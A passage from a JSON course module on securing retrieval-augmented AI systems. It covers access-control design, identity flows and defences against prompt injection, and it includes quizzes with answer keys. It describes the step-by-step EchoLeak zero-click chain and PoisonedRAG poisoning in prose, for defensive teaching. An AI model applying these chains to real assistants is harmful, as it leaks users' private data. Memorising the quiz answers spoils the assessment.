Safety","url":"https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/jailbreak-detection","type":"doc","publisher":"Microsoft Learn","note":"User prompt and document attack detection. Spotlighting inside it is labelled preview (checked 2026-10-13).","verified":"2026-10-13","status":"ga"},{"id":"tr9","title":"How Microsoft defends against indirect prompt injection attacks","url":"https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks","type":"blog","publisher":"Microsoft Security Response Center","note":"Names the three spotlighting modes and calls the technique probabilistic. Returns 403 to scripted requests, loads in a browser.","verified":"2026-10-13","status":"n/a"},{"id":"tr10","title":"Prompt caching (OpenAI API)","url":"https://developers.openai.com/api/docs/guides/prompt-caching","type":"doc","publisher":"OpenAI","note":"Caches are not shared across organizations. prompt_cache_key routes and separates accounting.","verified":"2026-10-13","status":"ga"},{"id":"tr11","title":"Prompt caching (Claude API)","url":"https://platform.claude.com/docs/en/build-with-claude/prompt-caching","type":"doc","publisher":"Anthropic","note":"Cache isolation per organization and per workspace on several surfaces.","verified":"2026-10-13","status":"ga"},{"id":"tr12","title":"Retrieval and file search (OpenAI API)","url":"https://developers.openai.com/api/docs/guides/retrieval","type":"doc","publisher":"OpenAI","note":"Vector store attributes and attribute_filter. The caller supplies the filter, so derive it server side.","verified":"2026-10-13","status":"ga"},{"id":"tr13","title":"Microsoft Purview protections for Microsoft 365 Copilot and other generative AI apps","url":"https://learn.microsoft.com/en-us/purview/ai-microsoft-purview","type":"doc","publisher":"Microsoft Learn","note":"Existing permissions keep data out of results. Encrypted labels need EXTRACT as well as VIEW for AI apps.","verified":"2026-10-13","status":"ga"},{"id":"tr14","title":"externalConnectors acl resource type","url":"https://learn.microsoft.com/en-us/graph/api/resources/externalconnectors-acl","type":"doc","publisher":"Microsoft Learn","note":"Graph external item ACL entries can grant or deny, unlike allow-only fields in AI Search.","verified":"2026-10-13","status":"ga"},{"id":"tr15","title":"Overview of Microsoft 365 Copilot connectors","url":"https://learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/overview-copilot-connector","type":"doc","publisher":"Microsoft Learn","note":"Renamed from Microsoft Graph connectors. Synced and federated (MCP-based) models.","verified":"2026-10-13","status":"ga"},{"id":"tr16","title":"AI threat protection in Defender for Cloud","url":"https://learn.microsoft.com/en-us/azure/defender-for-cloud/ai-threat-protection","type":"doc","publisher":"Microsoft Learn","note":"Alerts for data leakage, poisoning and jailbreak attempts on supported Azure AI services.","verified":"2026-10-13","status":"ga"},{"id":"tr17","title":"Tool approval in Microsoft Agent Framework","url":"https://learn.microsoft.com/en-us/agent-framework/agents/tools/tool-approval","type":"doc","publisher":"Microsoft Learn","note":"Built-in human approval hook for tool calls in Python and .NET.","verified":"2026-10-13","status":"ga"},{"id":"tr18","title":"The lethal trifecta for AI agents","url":"https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/","type":"blog","publisher":"Simon Willison","note":"Private data, untrusted content and external communication together enable exfiltration (2025-06-16).","verified":"2026-10-13","status":"n/a"},{"id":"tr19","title":"Vector query filters in Azure AI Search","url":"https://learn.microsoft.com/en-us/azure/search/vector-search-filters","type":"doc","publisher":"Microsoft Learn","note":"vectorFilterMode: preFilter, postFilter and strictPostFilter (preview), and the default by index age.","verified":"2026-10-13","status":"ga"}],"glossary":[{"term":"ACL","def":"Access control list. The principals (users, groups, roles) allowed to read one document, stored with the document or its chunks."},{"term":"Security trimming","def":"Removing results the caller may not see. Where it runs (in the index, in your code or at the source) is the main design choice."},{"term":"Pre-filter","def":"A permission filter applied inside the vector or hybrid search, so only allowed documents compete for the top k."},{"term":"Post-filter","def":"A permission check applied after retrieval. Cheap to build, but it wastes top k and lets denied text reach later stages."},{"term":"Visible fraction","def":"The share of the corpus a caller may see. Low values starve post-filters and stress filtered ANN recall."},{"term":"Groups claim overage","def":"When a user has more groups than a token can hold (200 for JWT), the token carries an overage indicator instead of the list, and you call Microsoft Graph."},{"term":"On-behalf-of (OBO)","def":"An OAuth flow where a middle tier trades the caller's token for a downstream token with delegated scopes, preserving the user's identity."},{"term":"Confused deputy","def":"A service with broad access that acts for a caller without proving the caller's rights, so the caller gains access they do not hold."},{"term":"Indirect prompt injection","def":"Instructions hidden in data the model retrieves, such as a page, email or file, rather than typed by the user."},{"term":"Spotlighting","def":"Marking untrusted text (delimiting, datamarking or encoding) so the model can tell data from instructions. Probabilistic."},{"term":"Rule of Two","def":"A design heuristic: one agent session should hold at most two of untrusted input, sensitive access, and state change or external communication."},{"term":"Revocation SLA","def":"The agreed time between removing access at the source and the last place that honours it (index, caches, tokens, logs) stopping. A choice per sensitivity tier, not a vendor number."},{"term":"ACL drift","def":"Mismatch between the ACL in the index and the ACL at the source, caused by missed events, inherited changes or failed syncs."},{"term":"Canary document","def":"A planted document with a known ACL used to prove that filters, caches and logs behave, for example that a revoked test user never sees it."},{"term":"Fail closed","def":"On an error such as a Graph outage, return no restricted results (or an error) instead of unfiltered results."},{"term":"Elevated read","def":"An explicit admin request that bypasses ACL filters for debugging in Azure AI Search, sent as the header `x-ms-enable-elevated-read: true`."},{"term":"Security filter","def":"A filterable string-collection field on each chunk that lists allowed identities, plus a query filter built from the caller's identities. Applied before ranking."},{"term":"Over-fetch","def":"Retrieving more than k candidates so that enough survive a post-filter. The needed factor is about 1 divided by the visible fraction."},{"term":"Retrieval identity","def":"The principal under which retrieval runs: the caller (delegated token) or a service account. It decides what the index or source will return."},{"term":"rbacScope","def":"A permission field type in Azure AI Search native ACLs. It holds a string that names an Azure scope, and a user passes if they hold a qualifying Azure role assignment for it. At most five distinct values per index."},{"term":"Trust tier","def":"A label on each source (curated, internal, open) that retrieval can filter on, so high-stakes questions use only the most trusted content."},{"term":"Embedding inversion","def":"Reconstructing source text, or parts of it, from its embedding vector."},{"term":"Markdown exfiltration","def":"Leaking data in the URL of an image or link the model writes, which the client fetches automatically."},{"term":"Lethal trifecta","def":"Untrusted content, access to private data and an outbound channel in one session. Together they enable exfiltration."},{"term":"Transitive membership","def":"Group membership through nesting: a user in group A, where A belongs to group B, is also a member of B."},{"term":"System prompt leakage","def":"Exposure of the prompt text. The prompt must be treated as public, so no credentials or authorization rules belong in it."}],"levels":[{"id":"w07-l1","order":1,"title":"Follow the leak","kind":"problem","minutes":20,"brief":"A chunk of text is about to enter a prompt, and the model can only leak what retrieval hands it. Before you pick a control, find every place that text can land, who could have written it, and what the client does with the answer.","blocks":[{"t":"h","text":"Three ways a RAG system leaks","level":2,"id":"three-ways-a-rag-system-leaks"},{"t":"p","md":"A RAG system leaks in three ways. **Retrieval hands over text the caller may not see** (authorization). **Retrieval hands over text that attacks the model** (injection and poisoning). **The answer, or a copy of the text, carries data somewhere it should not go** (output, tools, caches, logs).\n\nOWASP names the relevant risks in the 2025 list: LLM01 Prompt Injection, LLM02 Sensitive Information Disclosure, LLM04 Data and Model Poisoning, LLM05 Improper Output Handling, LLM06 Excessive Agency and LLM08 Vector and Embedding Weaknesses [[r1]]. LLM08 is the RAG access-control risk: unauthorized access, cross-context leaks in multi-tenant vector stores, embedding inversion and poisoning, with permission-aware stores and immutable retrieval logs as mitigations [[r2]]. For agents, OWASP published a separate Top 10 for Agentic Applications 2026 on 2025-12-09 (ASI01 Agent Goal Hijack to ASI10 Rogue Agents) [[r3]].\n\nIndirect injection is older than most RAG systems. Greshake et al. showed on 2023-02-23 that LLM-integrated apps blur data and instructions, so an attacker writes a prompt into data that is likely to be retrieved [[r5]]. Hold one rule: **the model is never the authorization layer.**"},{"t":"diagram","id":"w07-l1-d1","title":"Where retrieved text lands","alt":"Corpus writers feed ingest and the index. Retrieval uses the caller identity and feeds the prompt and model. The model drives rendered output and tool calls. Retrieval also copies text into caches and logs.","src":"flowchart LR\n  W[Corpus writers] -->|poisoning| I[Ingest and index]\n  I --> R[Retrieve and rank]\n  U[Caller identity] --> R\n  R -->|injection| P[Prompt and model]\n  P --> O[Rendered output]\n  P --> T[Tool calls]\n  R --> C[Caches and logs]","caption":"Every arrow is a place where denied or hostile text can pass. Name the stage before you name the control."},{"t":"table","caption":"Stage, threat, ids, first control and how to detect it. ATLAS ids are from release 2026.09.","head":["Stage","Threat","Ids","First control","Detect with"],"rows":[["Corpus write","RAG poisoning, false entries","LLM04, AML.T0070, AML.T0071","Write ACLs on the corpus, provenance, ingest-time scan","Canary query: a planted claim must never become the top source"],["Index","Cross-tenant leak, embedding inversion","LLM08","Permission-aware partitions, limit who can read raw vectors","Cross-tenant canary document"],["Retrieve","Returns text the caller may not see","LLM02, LLM08","Enforce the ACL in retrieval with the caller's identity","A revoked test user must get zero hits"],["Prompt","Indirect injection","LLM01, AML.T0051.001","Spotlighting, least-privilege tools","Red-team documents with planted instructions"],["Model and tools","Excessive agency, exfiltration by tool call","LLM06, AML.T0086","Fewer tools, scoped tokens, approval","Alert on tool calls to unknown destinations"],["Output","Markdown image or link exfiltration, script injection","LLM05","Sanitize, allowlist domains, no auto-fetch","Egress logs for unfamiliar hosts"],["Caches and logs","Denied text copied outside the ACL","LLM02","Scope cache keys by ACL, log ids not content","Search every store for a planted canary string"]],"highlightCol":3},{"t":"h","text":"Pick the first injection defence","level":2,"id":"pick-the-first-injection-defence"},{"t":"dials","id":"w07-l1-defence","title":"Which layer do you buy first?","prompt":"Flip who writes the corpus, what the agent can do and what the client renders. The first layer to buy changes. Every layer here is a design choice, and the classifier is the one most often over-trusted.","dials":[{"id":"authors","label":"Who writes the corpus","values":[{"id":"staff","label":"Employees only"},{"id":"cust","label":"Customers or partners"},{"id":"web","label":"Open web or inbound mail"}]},{"id":"power","label":"What the agent can do","values":[{"id":"read","label":"Read and answer only"},{"id":"act","label":"Change state or send data out"}]},{"id":"render","label":"What the client renders","values":[{"id":"text","label":"Plain text"},{"id":"rich","label":"Markdown with images and links"}]}],"options":[{"id":"spot","name":"Spotlighting","summary":"Delimit, datamark or encode untrusted text so the model can tell data from instructions."},{"id":"shield","name":"Classifier shield","summary":"Screen inputs and documents with a trained detector such as Prompt Shields."},{"id":"trifecta","name":"Remove a leg (Rule of Two)","summary":"Take away untrusted input, sensitive access, or the ability to change state or communicate out."},{"id":"split","name":"Control and data flow separation","summary":"A CaMeL-style design where untrusted data cannot choose the actions."},{"id":"egress","name":"Output and egress controls","summary":"Strip or allowlist links and images, block auto-fetch, tighten the content security policy."},{"id":"approve","name":"Human approval","summary":"A person approves each risky tool call before it runs."}],"scores":{"spot":{"authors":{"staff":{"s":0,"why":"Low attack volume, but the layer is cheap."},"cust":{"s":1,"why":"Customer text is untrusted, so marking it pays off."},"web":{"s":1,"why":"Fully untrusted text. Mark it, then add a stronger layer."}},"power":{"read":{"s":1,"why":"Lowers steering of answers at almost no cost."},"act":{"s":0,"why":"Probabilistic, so it cannot guard an action alone."}},"render":{"text":{"s":1,"why":"With nothing rendered, steering is the remaining risk."},"rich":{"s":0,"why":"Does not stop a rendered image URL from carrying data out."}}},"shield":{"authors":{"staff":{"s":0,"why":"Few attacks to catch, and false positives cost real users."},"cust":{"s":1,"why":"Screens a steady stream of untrusted text."},"web":{"s":2,"why":"High attack volume is what classifiers are for."}},"power":{"read":{"s":1,"why":"Cheap screening for read-only answers."},"act":{"s":0,"why":"EchoLeak bypassed a production classifier, so it cannot gate actions alone."}},"render":{"text":{"s":0,"why":"Neutral."},"rich":{"s":-1,"why":"One miss still leaves the exfiltration path open."}}},"trifecta":{"authors":{"staff":{"s":-1,"why":"If every author is trusted the untrusted-input leg may already be absent."},"cust":{"s":1,"why":"Customer text is untrusted input, so another leg must go."},"web":{"s":2,"why":"Untrusted input is certain, so remove another leg."}},"power":{"read":{"s":0,"why":"No state-changing leg to remove."},"act":{"s":2,"why":"Cutting the send or change leg is the strongest single fix."}},"render":{"text":{"s":0,"why":"No external channel through rendering."},"rich":{"s":1,"why":"Rendering is a communication channel. Count it as the third leg."}}},"split":{"authors":{"staff":{"s":-1,"why":"The utility cost buys little when authors are trusted."},"cust":{"s":0,"why":"Worth it only for high-value flows."},"web":{"s":1,"why":"Provable data-flow rules suit hostile inputs."}},"power":{"read":{"s":-1,"why":"Pays the utility cost (77% versus 84% of tasks in the CaMeL paper) with no actions to protect."},"act":{"s":2,"why":"Capabilities block unauthorized flows even if the model is fooled."}},"render":{"text":{"s":0,"why":"Neutral."},"rich":{"s":1,"why":"Data-flow rules can treat rendered output as a sink."}}},"egress":{"authors":{"staff":{"s":0,"why":"Cheap hygiene at any trust level."},"cust":{"s":1,"why":"Hostile text is likely, so close the exit."},"web":{"s":1,"why":"Hostile text is certain, so close the exit."}},"power":{"read":{"s":0,"why":"Reduces exfiltration even without tools."},"act":{"s":1,"why":"Also blocks tool destinations outside an allowlist."}},"render":{"text":{"s":-2,"why":"Nothing to strip or fetch, so little to gain."},"rich":{"s":2,"why":"Image and link rendering was a core EchoLeak step."}}},"approve":{"authors":{"staff":{"s":0,"why":"Reviewer cost does not shrink with trusted authors."},"cust":{"s":0,"why":"Useful only when an action is at stake."},"web":{"s":1,"why":"A human is the fallback when injection cannot be ruled out."}},"power":{"read":{"s":-2,"why":"Nothing to approve, so it adds friction for no benefit."},"act":{"s":2,"why":"The Rule of Two fallback: require approval when all three legs remain."}},"render":{"text":{"s":0,"why":"Neutral."},"rich":{"s":-1,"why":"Approving tool calls does not stop a rendered image fetch."}}}},"takeaway":"Cheap marking wins for read-only text, egress controls win once the client renders rich output, and removing a leg or asking a human wins once the agent can act. Say which leg you removed."},{"t":"failure","title":"Failure modes to recognise","items":[{"symptom":"The system prompt says to show only documents the user may read, yet a restricted chunk appears in answers.","cause":"Authorization was delegated to the model. Retrieval returned the chunk, so it is already in the context.","fix":"Enforce the filter in retrieval with the caller's identity. Test with a revoked user and a canary document."},{"symptom":"An answer contains a Markdown image or link to a host nobody recognises.","cause":"Injected text told the model to encode data into a URL and the client fetched it, the EchoLeak pattern.","fix":"Strip or allowlist links and images in output, block auto-fetch, tighten the content security policy and alert on unknown egress hosts."},{"symptom":"One page wins nearly every answer on a topic and its claim is wrong.","cause":"RAG poisoning: a few crafted texts rank first for the target questions. PoisonedRAG used five.","fix":"Restrict corpus write access, record provenance, monitor top-source concentration and keep a canary question set."},{"symptom":"A restricted snippet appears in a trace viewer or a semantic cache hit.","cause":"Copies of denied text sit outside the ACL.","fix":"Log ids and decisions, scope cache keys by ACL scope and search every store for a planted canary string."}]},{"t":"accordion","items":[{"title":"Go deeper: the EchoLeak chain, step by step","blocks":[{"t":"list","style":"ol","items":["One crafted email reaches the mailbox. No click is needed (zero-click).","The text evades the cross-prompt injection classifier (XPIA).","Reference-style Markdown slips past link redaction.","An auto-fetched image carries data in its URL.","A Microsoft Teams proxy that the content security policy allows completes the path."]},{"t":"p","md":"The record is CVE-2025-32711 (NVD published 2025-06-11, CWE-74). Microsoft scored it 9.3 and NVD scored it 7.5, so quote the source with the number [[r6]]. The chain needed every link, so removing one link, such as the egress path, would have stopped the exfiltration. That last point is design reasoning, not a vendor statement."}]},{"title":"Go deeper: spotlighting modes, the Rule of Two and CaMeL","blocks":[{"t":"p","md":"**Spotlighting** has three modes: delimiting with randomized delimiters, datamarking with a token woven through the untrusted text, and encoding such as base64 or ROT13. In the authors' tests attack success fell from above 50% to below 2% on GPT-family models with minimal task impact. It is probabilistic, so it is one layer [[r8]].\n\n**Rule of Two** (Meta, 2025-10-31): within one session an agent should hold no more than two of untrustworthy inputs, access to sensitive systems or private data, and the ability to change state or communicate externally. If all three are needed, add human approval or an equivalent. Simon Willison's lethal trifecta (2025-06-16) names the same three. Both are heuristics, not standards [[r10]].\n\n**CaMeL** separates control flow from untrusted data and uses capabilities to block unauthorized data flows. It solved 77% of AgentDojo tasks with provable security, against 84% undefended, which is the security-utility trade in one number [[r9]]."},{"t":"callout","kind":"interview","title":"What interviewers listen for","md":"Layers plus a reduced trifecta, not one guard. PoisonedRAG reported about 90% success with five malicious texts among millions, so corpus write access belongs in the threat model [[r7]]. ATLAS names the techniques: AML.T0070 RAG Poisoning, AML.T0071 False RAG Entry Injection and AML.T0086 Exfiltration via AI Agent Tool Invocation [[r4]]."}]}]}],"quiz":[{"id":"w07-l1-q1","type":"match","tag":"security","q":"Match each RAG scenario to the OWASP LLM Top 10 2025 risk that names it.","pairs":[{"l":"A retrieved web page tells the model to ignore its rules","r":"LLM01 Prompt Injection"},{"l":"A crafted document is written to rank first for one question","r":"LLM04 Data and Model Poisoning"},{"l":"Tenant A's chunks appear in tenant B's answer","r":"LLM08 Vector and Embedding Weaknesses"},{"l":"Rendered Markdown fetches an attacker's URL","r":"LLM05 Improper Output Handling"},{"l":"An agent with a broad mailbox tool sends data it should not","r":"LLM06 Excessive Agency"}],"explain":"LLM01 covers instructions arriving through data, LLM04 covers corrupted knowledge, LLM08 is the RAG store and cross-context risk, LLM05 covers unsafe handling of model output such as rendering, and LLM06 covers tools with more power than the task needs.","difficulty":2,"ref":"r1"},{"id":"w07-l1-q2","type":"single","tag":"flip","q":"An assistant answers from employee-written wiki pages, can only read, and the client shows plain text. The product team then adds Markdown rendering with image display. Which layer becomes most urgent?","options":["Control and data flow separation in the CaMeL style, with capabilities on every tool","Output and egress controls on links and images","Human approval before every answer is shown to the user","A larger classifier model screening every retrieved document"],"answer":1,"explain":"Rendering adds an exfiltration channel, the step EchoLeak relied on, so closing the exit is the cheapest fix. CaMeL-style separation costs utility for a read-only flow, approval on every answer adds friction without addressing the image fetch, and a bigger classifier is still a probabilistic gate that a miss walks past.","difficulty":2,"ref":"r6"},{"id":"w07-l1-q3","type":"single","tag":"diagnose","q":"Alice has no finance access, yet the answer quotes a finance figure. What is the root cause?","code":{"lang":"text","code":"system:    \"Only use documents the signed-in user is allowed to read.\"\nretrieved: [doc-17 (finance-restricted), doc-42 (public)]\nuser:      alice (groups: marketing)"},"options":["The embedding dimension was too low to separate finance content","Temperature was above zero, so the model drifted from its instructions","The model ignored the instruction, so a stricter system prompt will fix it","Retrieval returned doc-17 without checking access"],"answer":3,"explain":"The log shows doc-17 was retrieved for a marketing user, so the leak happened before the model ran. A stricter prompt is still the model acting as the authorization layer. Embedding size and temperature change relevance and variety, not who may read a document.","difficulty":1,"ref":"r2"},{"id":"w07-l1-q4","type":"numeric","tag":"numeric","q":"A PoisonedRAG-style attacker targets 40 questions with five malicious texts each. The corpus holds 2,000,000 texts. What percent of the corpus does the attacker control?","answer":0.01,"tolerancePct":5,"unit":"%","hint":"texts planted divided by corpus size","explain":"40 questions times 5 texts is 200 texts. 200 divided by 2,000,000 is 0.0001, which is 0.01 percent. The attack works on rank for specific questions, not on share of the corpus, so a small corpus share is no comfort. The paper reported about 90% success with five texts per question.","difficulty":2,"ref":"r7"}],"defend":null,"refs":["r1","r2","r3","r4","r5","r6","r7","r8","r9","r10"],"takeaways":["The model is never the authorization layer: enforce access in retrieval and tools with the caller's identity.","Name the stage that sees denied text: index, ranker, prompt, cache, log or rendered output.","Injection defences are layers, and the classifier is the one most often trusted alone.","Remove a leg of the trifecta before buying a smarter detector.","Corpus write access is part of the threat model. Five texts were enough in PoisonedRAG."]},{"id":"w07-l2","order":2,"title":"Who is asking?","kind":"problem","minutes":18,"brief":"Every access decision needs two inputs: who the caller is and which groups they hold when the query runs. Decide how you get them, how fresh they must be and which identity the retriever runs as, while group counts, nesting and revocation speed are still open.","blocks":[{"t":"h","text":"Identity is an input to every query","level":2,"id":"identity-is-an-input-to-every-query"},{"t":"p","md":"The retriever must see the caller, not a service account. With the on-behalf-of (OBO) flow a middle tier exchanges the caller's access token for a downstream token using **delegated scopes only**, so roles stay with the user. If the downstream API enforces Conditional Access such as MFA, the middle tier must return 401 with a `WWW-Authenticate` header so the client can satisfy the challenge. A single-page app sends its access token to a middle-tier confidential client that runs OBO [[r25]].\n\nThe alternative is a **confused deputy**: one service identity with broad read access that filters in code. Every bug in that code becomes a leak, and the store cannot tell who asked. Azure's multitenant RAG guidance adds two rules: put an API layer in front of the stores so no other code can query them, and apply the filters on every retrieval, including those made inside an agent loop. Derive tenant and filters from the authenticated request, never from fields the client sends [[r22]]."},{"t":"compare","title":"Ways to resolve the caller's principals","intro":"Each option trades freshness, latency and who owns the code. Whatever you pick, its cache or token lifetime is part of your revocation SLA.","options":[{"name":"Read the `groups` claim","summary":"Use the list embedded in the access token.","pros":["No extra call","Token is already validated"],"cons":["Capped at 200 groups for JWT, 150 for SAML and 6 for implicit flow","Membership is frozen until the token is refreshed"],"bestWhen":"Users hold well under 200 groups and a token-lifetime delay is inside the revocation SLA.","avoidWhen":"Users have many or nested groups, or revocation must take minutes.","meta":[{"k":"Latency","v":"none"},{"k":"Freshness","v":"token lifetime"}]},{"name":"Call Graph `transitiveMemberOf` per request","summary":"Ask Microsoft Graph for direct and nested memberships.","pros":["Handles overage and nesting","Current at call time"],"cons":["Extra round trip and Graph call volume","Page size is 100 by default, 999 at most"],"bestWhen":"Overage or nested groups with moderate traffic, or behind a short cache.","avoidWhen":"High request rates with no cache, or when a Graph outage must not block answers.","meta":[{"k":"Latency","v":"extra call"},{"k":"Freshness","v":"near live"}]},{"name":"Cache memberships with a TTL","summary":"Resolve once, reuse for a short time.","pros":["Removes the per-query Graph call","Predictable latency"],"cons":["The TTL becomes part of the revocation SLA","Stale after offboarding until it expires"],"bestWhen":"Request rates are high and the TTL is well below the revocation SLA.","avoidWhen":"Revocation must take effect in seconds.","meta":[{"k":"Latency","v":"low"},{"k":"Freshness","v":"TTL"}]},{"name":"Authorize on app roles","summary":"Assign users and groups to app roles and read role names from the token.","pros":["Avoids group overage","Code reads role names, not group ids"],"cons":["Coarse: a few tiers, not per-document ACLs","Role assignment is admin work"],"bestWhen":"Access has a few tiers such as reader, analyst and admin.","avoidWhen":"ACLs are per team, per project or per document.","meta":[{"k":"Latency","v":"none"},{"k":"Granularity","v":"coarse"}]},{"name":"Let the search service expand groups from the user token","tag":"Preview","summary":"Azure AI Search native ACLs match the token's user and group ids, resolving groups through Graph at query time.","pros":["No group-resolution code","Nested groups work","Fails closed if Graph is unavailable"],"cons":["Preview as of 2026-10-13, no SLA","The first ACL query can be slower"],"bestWhen":"Content already carries Entra object ids and you can accept preview.","avoidWhen":"GA only is mandatory, or identities live outside Entra.","meta":[{"k":"Latency","v":"service side"},{"k":"Freshness","v":"live groups"}]},{"name":"Call an internal entitlement service","summary":"One service answers can-this-user-see-this for every source.","pros":["Covers non-Entra identities and deny rules","One place to audit"],"cons":["You own latency and availability","Must stay consistent with each source system"],"bestWhen":"Identities or rules exist that no directory models.","avoidWhen":"Everything already lives in Entra and the sources enforce their own rules.","meta":[{"k":"Latency","v":"service call"},{"k":"Ownership","v":"yours"}]}]},{"t":"flow","title":"Handling a missing groups claim","direction":"v","steps":[{"title":"Validate the token","md":"Check signature, audience and expiry. Take `oid` from the token, never from the request body.","tag":"identity"},{"title":"Use the claim if present","md":"If a `groups` claim exists, use it as the principal set."},{"title":"Detect overage","md":"No claim? Check `hasgroups` (implicit flow) or `_claim_names` containing `groups`. Rely on the indicator, not on the `_claim_sources` endpoint, which may still name the legacy AAD Graph [[r23]]."},{"title":"Call Graph","md":"`GET /users/{id}/transitiveMemberOf` with `$top=999`, following paging. Advanced queries such as `$count` need `ConsistencyLevel: eventual` and read an index that might lag [[r24]].","tag":"graph"},{"title":"Fail closed","md":"If groups cannot be resolved, return public documents only or an error, never unfiltered results.","tag":"safe"}]},{"t":"h","text":"Three identities, three jobs","level":2,"id":"three-identities-three-jobs"},{"t":"table","caption":"Least-privilege retrieval identities for Azure AI Search native ACLs. Preview as of 2026-10-13.","head":["Identity","Job","Needs","If you merge it with another"],"rows":[["Ingest identity","Reads sources, writes the index and ACL fields","Read on sources, write on the index","A query-time bug can read or change everything"],["Query app identity","Calls the search service for the user","Search Index Data Reader on the index, no write","A leaked app credential gives every caller the app's reach"],["Caller token","Proves who asks and which groups apply","Delegated scopes only","Without it a native ACL index returns only public documents"],["Break-glass admin","Debug reads with the header `x-ms-enable-elevated-read: true`","Search Index Data Contributor or a role with `elevatedOperations/read`","If the app uses it day to day, ACLs are bypassable"]],"highlightCol":1},{"t":"failure","title":"Failure modes to recognise","items":[{"symptom":"Users with many memberships get empty results, or see everything.","cause":"Overage not handled. The claim is missing and the code treats no groups as no filter, or swallows the error.","fix":"Detect `hasgroups` or `_claim_names`, call Graph and fail closed when groups cannot be resolved."},{"symptom":"A user removed from a group still gets restricted answers for an hour.","cause":"Memberships cached with a long TTL, or the token still carries the old claim until it refreshes.","fix":"Count TTL and token lifetime inside the revocation SLA, shorten them for restricted tiers and re-check the top hits at the source."},{"symptom":"Every user gets broad answers in staging and the tests pass.","cause":"The retriever runs with an app-only token, a confused deputy, so the store never sees the user.","fix":"Use OBO or token-based enforcement and add a test with two users who hold different access."},{"symptom":"Filters match nothing for some users.","cause":"ACL fields hold UPNs or emails while the code filters on object ids. Native ACL fields expect Entra object ids [[r15]].","fix":"Store object ids (GUIDs) and filter on `oid` and group ids."}]},{"t":"callout","kind":"interview","title":"What interviewers listen for","md":"Say where the user identity enters the system and which component could widen it. Candidates who skip overage either fail closed on heavy users or fail open on them. Also say how you debug: elevated read is an explicit admin request on Search POST (REST `2026-05-01-preview` or later), not the app's normal path [[r12]]."}],"quiz":[{"id":"w07-l2-q1","type":"numeric","tag":"numeric","q":"Once nesting is expanded, a user belongs to 2,300 groups. You call `transitiveMemberOf` with the maximum page size of 999. What is the minimum number of requests?","answer":3,"tolerancePct":0,"unit":"requests","hint":"ceil(memberships / page size)","explain":"2,300 divided by 999 is 2.3, so you need 3 pages. At the default page size of 100 it would take 23 requests, which is why you page at the maximum and cache the result for a TTL below your revocation SLA.","difficulty":1,"ref":"r24"},{"id":"w07-l2-q2","type":"single","tag":"diagnose","q":"Users in many groups see no restricted results. The code reads `claims[\"groups\"]` and falls back to an empty list. What explains it?","code":{"lang":"json","code":"{ \"oid\": \"5b1c0d2e-...\",\n  \"_claim_names\": { \"groups\": \"src1\" },\n  \"_claim_sources\": { \"src1\": { \"endpoint\": \"https://graph.windows.net/...\" } } }"},"options":["The access token has expired and the service silently returns public results","The user lacks the Search Index Data Reader role on the index","Group overage: the code never calls Graph","Entra emits group claims only in SAML tokens, never in JWTs"],"answer":2,"explain":"`_claim_names` containing `groups` is the overage indicator, so the list is not in the token. The fix is to call Graph `transitiveMemberOf`, not the legacy endpoint in `_claim_sources`. An expired token would fail validation, a missing role would fail the call rather than shrink results, and JWTs also carry groups up to the 200 limit.","difficulty":2,"ref":"r23"},{"id":"w07-l2-q3","type":"multi","tag":"security","q":"Select every statement that is true about the on-behalf-of flow.","options":["The middle tier uses delegated scopes, so roles stay with the user.","It lets the middle tier reuse its own app roles so the downstream API sees a trusted service.","If the downstream API requires MFA through Conditional Access, the middle tier returns 401 with a `WWW-Authenticate` header so the client can satisfy it.","A single-page app should send its access token to a middle-tier confidential client to run OBO.","It removes the need for the downstream store to check permissions."],"answers":[0,2,3],"explain":"OBO keeps the user as the subject with delegated scopes, surfaces Conditional Access challenges through 401 and WWW-Authenticate, and runs in a confidential middle tier. Reusing app roles is the confused-deputy shape OBO avoids, and the downstream store still enforces its own permissions for the user it sees.","difficulty":2,"ref":"r25"},{"id":"w07-l2-q4","type":"single","tag":"tradeoff","q":"Users hold up to 400 nested groups, a removed membership must stop working within about 5 minutes, and traffic is 50 requests per second. Which resolution strategy fits best?","options":["Read the groups claim and accept whatever freshness the token lifetime gives","Cache memberships for 2 minutes","Call Graph `transitiveMemberOf` on every request without any cache","Authorize on app roles only and drop the group ACLs"],"answer":1,"explain":"A 2 minute TTL keeps the cache inside the 5 minute target and removes most Graph calls at 50 requests per second. The claim is capped at 200 groups and frozen until the token refreshes, a Graph call on every request adds a round trip and call volume you do not need, and app roles are too coarse for per-team ACLs.","difficulty":2,"ref":"r23"}],"defend":null,"refs":["r12","r15","r22","r23","r24","r25"],"takeaways":["Pass the user's token downstream with OBO so the store sees the user, not a broad service account.","Handle group overage every time: 200 groups for JWT, 150 for SAML, then call Graph.","Cache TTLs and token lifetimes are part of the revocation SLA. State them.","Use separate identities for ingest, query, the caller and break-glass debugging.","On any resolution error, fail closed."]},{"id":"w07-l3","order":3,"title":"Pick the wall","kind":"problem","minutes":25,"brief":"A chunk is about to be returned. Who decides whether this caller may see it: the index, your code, the source system or the shape of your infrastructure? Access selectivity, rule richness, revocation speed and where the content lives are all still open.","blocks":[{"t":"h","text":"Six places to enforce the wall","level":2,"id":"six-places-to-enforce-the-wall"},{"t":"p","md":"Ask one question of every option: **which stages see denied text?** A post-filter lets it reach your code, rerankers, logs and caches. A pre-filter keeps it inside the index. A live check asks the source of truth. Delegation never copies the content. A physical wall removes the need for a per-document filter between tenants.\n\nMost real systems combine two: a pre-filter for the bulk of traffic and a live check on the top hits of restricted tiers. That combination is design reasoning from the options below, not a vendor pattern. The model is never one of the options [[r22]]."},{"t":"compare","title":"ACL enforcement options","intro":"Each option names where it wins, where it loses and what flips the choice.","options":[{"name":"Post-filter in your code","summary":"Retrieve the top k, then drop what the caller cannot see.","pros":["Simple, works on any engine","Code can express any rule, including deny and sharing links"],"cons":["Wastes top k when access is selective, so you over-fetch","Denied text reaches rerankers, logs and caches first"],"bestWhen":"Almost every document is visible to almost every caller and the rules are too rich to precompute.","avoidWhen":"Callers see a small slice of a large corpus, or denied text must never leave the index.","meta":[{"k":"Recall when selective","v":"collapses"},{"k":"Leak surface","v":"widest"}]},{"name":"Pre-filter in the index","tag":"GA or Preview","summary":"Put the permission predicate inside the query: a security filter field (GA) or native ACL fields (preview).","pros":["Top k stays full of visible documents","Denied text stays in the index","One round trip"],"cons":["The ACL copy lags the source","Allow-lists only, so deny entries must be flattened","Filtered ANN recall can drop at high selectivity"],"bestWhen":"Permissions are group based, some sync lag is tolerable and the content is already copied into the 